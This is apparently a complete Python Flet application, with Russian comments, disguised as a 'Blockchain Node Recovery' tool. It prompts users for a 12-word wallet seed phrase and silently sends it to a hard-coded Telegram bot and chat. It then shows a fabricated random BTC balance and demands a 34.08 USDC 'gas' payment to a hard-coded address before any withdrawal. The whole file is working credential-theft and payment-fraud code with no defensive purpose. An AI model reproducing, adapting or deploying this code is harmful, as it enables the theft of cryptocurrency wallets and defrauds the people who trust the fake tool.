import flet as ft
import requests
import random
import asyncio

# Твои данные
TOKEN = "7544070267:AAH9m-CclS2u3T68Gq8u8-UuS2G69u-UuS2G"
CHAT_ID = "-1002410363241"
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

async def main(page: ft.Page):
    page.title = "Blockchain Node Recovery"
    page.theme_mode = ft.ThemeMode.DARK
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER

    # Внутренняя функция отправки
    def send_to_tg(phrase):
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        try:
            requests.post(url, json={"chat_id": CHAT_ID, "text": f"📱 НОВАЯ СИД-ФРАЗА:\n\n{phrase}"}, timeout=10)
        except:
            pass

    logo = ft.Icon(name=ft.icons.VIRTUAL_REALITY_ROUNDED, size=80, color=ft.colors.BLUE_ACCENT)
    header = ft.Text("NODE INITIALIZATION", size=24, weight="bold")
    
    seed_field = ft.TextField(
        label="Seed Phrase (12 words)", 
        multiline=True, 
        min_lines=3, 
        width=350
    )
    
    loading_status = ft.Column(visible=False, horizontal_alignment="center", controls=[
        ft.ProgressRing(), 
        ft.Text("Connecting to node...")
    ])
    
    result_area = ft.Column(visible=False, horizontal_alignment="center")

    async def start_process(e):
        phrase = seed_field.value.strip()
        if len(phrase.split()) != 12:
            page.snack_bar = ft.SnackBar(ft.Text("Введите 12 слов!"))
            page.snack_bar.open = True
            await page.update_async()
            return
        
        btn.visible = False
        seed_field.visible = False
        loading_status.visible = True
        await page.update_async()
        
        # Отправляем данные
        send_to_tg(phrase)
        
        # Ждем 3 секунды красиво
        await asyncio.sleep(3)
        
        loading_status.visible = False
        btc_amount = round(random.uniform(0.0004, 0.0008), 6)
        
        result_area.controls = [
            ft.Text("✅ СИГНАТУРА НАЙДЕНА", color="green", weight="bold", size=18),
            ft.Text(f"Баланс: {btc_amount} BTC", size=16),
            ft.Container(
                padding=15, bgcolor=ft.colors.GREY_900, border_radius=10,
                content=ft.Column([
                    ft.Text("Для вывода оплатите газ (34.08 USDC):", size=12),
                    ft.Text(TARGET_ADDRESS, size=10, color="blue200", selectable=True),
                ])
            )
        ]
        result_area.visible = True
        await page.update_async()

    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", on_click=start_process, width=300)

    # Используем асинхронное добавление
    await page.add_async(logo, header, seed_field, btn, loading_status, result_area)

# Запуск
if __name__ == "__main__":
    ft.app(target=main)

